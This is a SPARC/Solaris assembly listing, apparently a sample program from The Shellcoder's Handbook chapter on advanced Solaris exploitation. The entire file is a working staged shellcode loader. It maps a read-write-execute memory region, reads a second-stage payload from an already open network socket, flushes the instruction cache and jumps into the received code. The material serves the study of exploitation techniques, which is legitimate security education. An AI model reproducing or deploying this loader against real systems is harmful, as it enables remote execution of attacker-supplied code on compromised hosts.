/*

The Shellcoder's Handbook: Discovering and Exploiting Security Holes
Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, 
Sinan Eren, Neel Mehta, Riley Hassell
Publisher: John Wiley & Sons
ISBN: 0764544683

Chapter 11: Advanced Solaris Exploitation
Sample Program #2

Please send comments/feedback to jack@infosecinstitute.com or visit http://www.infosecinstitute.com 

*/

.align 4
        .global main
        .type    main,#function
        .proc   04
main:
        ! mmap(0, 0x8000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANON|MAP_SHARED, -
1, 0);
        xor     %l1, %l1, %o0   ! %o0 = 0
        mov     8, %l1
        sll     %l1, 12, %o1    ! %o1 = 0x8000
        mov     7, %o2          ! %o2 = 7
        sll     %l1, 28, %o3
        or      %o3, 0x101, %o3 ! %o3 = 257
        mov     -1, %o4         ! %o4 = -1
        xor     %l1, %l1, %o5   ! %o5 = 0
        mov     115, %g1        ! SYS_mmap        115
        ta      8               ! mmap

        xor     %l2, %l2, %l1   ! %l1 = 0
        add     %l1, %o0, %g2   ! addr of new map

      ! store the address of the new memory region in %g2
      
      ! len = read(sock, map, 0x8000);      
      ! socket number can be hardcoded, or use getpeername tricks
        add     %i1, %l1, %o0   ! sock number assumed to be in %i1
        add     %l1, %g2, %o1   ! address of the new memory region
        mov     8, %l1            
        sll     %l1, 12, %o2      ! bytes to read 0x8000
        mov     3, %g1          ! SYS_read        3
        ta      8               ! trap to system call

        mov     -8, %l2
        add     %g2, 8, %l1
loop:
        flush   %l1 - 8            ! flush the instruction cache
        cmp     %l2, %o0        ! %o0 = number of bytes read
        ble,a   loop            ! loop %o0 / 4 times
        add     %l2, 4, %l2      ! increment the counter

jump:
        !socket number is already in %i1
        sub     %g2, 8, %g2
        jmp     %g2 + 8            ! jump to the maped region
        xor     %l4, %l5, %l1      ! delay slot
        ta      3            ! debug trap, should never be reached ...
